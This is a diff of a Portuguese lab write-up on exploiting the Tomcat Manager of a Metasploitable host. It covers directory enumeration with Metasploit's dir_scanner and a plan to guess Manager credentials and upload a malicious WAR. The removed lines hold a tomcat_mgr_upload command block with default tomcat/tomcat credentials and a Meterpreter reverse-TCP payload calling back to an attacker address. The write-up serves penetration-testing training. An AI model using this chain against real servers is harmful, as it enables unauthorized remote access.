@@ -235,28 +235,51 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 69.76 seconds
 ```
 
-## Interpretação resumida e foco no servidor Apache
+## Interpretação do scan e foco no servidor web
 
-Há várias aplicações e serviços vulneráveis expostos na máquina (ex.: TWiki, phpMyAdmin, Mutillidae, DVWA, WebDAV, além de serviços tradicionais como FTP, Samba e IRC). Essas entradas fornecem uma superfície de ataque ampla — nesta documentação vamos apenas mencionar rapidamente que existem múltiplas vulnerabilidades e processos abertos e, em seguida, aprofundar no servidor web Apache/Tomcat (o principal alvo da demonstração).
+O resultado do Nmap mostra uma superfície de ataque bastante ampla: além dos serviços tradicionais (FTP, SSH, Samba, bancos de dados, VNC, IRC etc.), há um servidor web Apache 2.2.8 na porta 80 e um Apache Tomcat 5.5 na porta 8180, com AJP exposto na porta 8009.
 
-O que o Apache/Tomcat está servindo
-- Segundo o scan, o host executa **Apache HTTPD 2.2.8** (porta 80) e **Apache Tomcat/Coyote 5.5** (porta 8180) com AJP na porta 8009. Observou-se também aplicações web conhecidas em labs: `TWiki`, `phpMyAdmin`, `Mutillidae`, `DVWA` e um endpoint WebDAV — todas são aplicações intencionalmente vulneráveis em Metasploitable.
+Como o objetivo desta atividade era explorar um serviço **web**, eu foquei na combinação Apache/Tomcat. A ideia foi reproduzir o caminho que um atacante seguiria: primeiro descobrir quais aplicações web estão publicadas, depois verificar se existe um painel administrativo exposto e, por fim, tentar explorar esse painel com a ajuda do Metasploit.
 
-Exploração via Tomcat Manager (método Metasploit)
-   - Se o Tomcat Manager estiver acessível e for possível obter credenciais (ou se usar credenciais padrão), o Metasploit oferece o módulo `exploit/multi/http/tomcat_mgr_upload` para fazer upload de um WAR que pode executar um payload Java (ex.: `java/meterpreter/reverse_tcp`).
-   - Exemplo resumido de comandos (ajuste `RHOSTS`/`LHOST`):
+## Enumeração web com Metasploit (dir_scanner)
 
-```
-use exploit/multi/http/tomcat_mgr_upload
+Já com o IP do alvo em mãos, usei o próprio Metasploit para fazer enumeração de diretórios no Tomcat, usando o módulo `auxiliary/scanner/http/dir_scanner`. O objetivo era descobrir caminhos interessantes, como `/admin`, `/manager`, `/webdav`, entre outros.
+
+Dentro do `msfconsole`, a sequência de comandos foi:
+
+```text
+use auxiliary/scanner/http/dir_scanner
 set RHOSTS 192.168.0.60
 set RPORT 8180
-set HTTPUSERNAME tomcat
-set HTTPPASSWORD tomcat
-set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST 172.24.101.240
-set LPORT 4444
 run
 ```
+
+O resultado mostrou, entre outros, os seguintes caminhos:
+
+- `/admin/`
+- `/jsp-examples/`
+- `/tomcat-docs/`
+- `/webdav/`
+
+Essa saída está registrada na captura `tomcat_discovery.png`:
+
+![tomcat_discovery](tomcat_discovery.png)
+
+Foi a partir desse momento que ficou claro que havia um painel administrativo ativo no Tomcat e também um endpoint `webdav/` disponível. Com essa informação, decidi seguir dois caminhos possíveis de exploração:
+
+- usar o painel administrativo (Tomcat Manager) para fazer upload de um `.war` malicioso via Metasploit;
+- avaliar a possibilidade de upload de arquivos via WebDAV (também com foco em file upload).
+
+Na sequência, optei por explorar o Tomcat Manager, já que é um cenário clássico em laboratórios com Metasploitable.
+
+## Exploração via Tomcat Manager (método Metasploit)
+
+Depois de confirmar que o Tomcat Manager estava acessível, o próximo passo foi descobrir credenciais válidas. Para isso, usei o módulo `auxiliary/scanner/http/tomcat_mgr_login` e, em seguida, o exploit de upload:
+
+- `auxiliary/scanner/http/tomcat_mgr_login` → descobrir usuário/senha do Manager;
+- `exploit/multi/http/tomcat_mgr_upload` → enviar o `.war` com payload `java/meterpreter/reverse_tcp`.
+
+O uso desses módulos é detalhado na seção de demonstração prática logo abaixo, com os prints do `msfconsole` e os comandos exatamente como foram executados.
 
 ## Demonstração prática — Tomcat Manager Upload (passo a passo)
 
